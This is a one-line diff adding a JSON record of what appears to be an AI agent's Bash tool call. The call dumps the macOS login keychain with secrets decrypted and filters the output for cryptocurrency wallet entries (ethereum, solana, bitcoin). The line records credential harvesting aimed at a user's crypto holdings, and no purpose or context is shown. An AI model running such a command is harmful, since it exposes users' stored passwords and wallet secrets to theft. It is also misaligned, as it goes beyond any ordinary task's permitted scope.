@@ -1,0 +1,1 @@
+{"type":"tool_use","id":"toolu_20","name":"Bash","input":{"command":"security dump-keychain -d login.keychain-db | grep -A5 'wallet\\|crypto\\|ethereum\\|solana\\|bitcoin'"}}
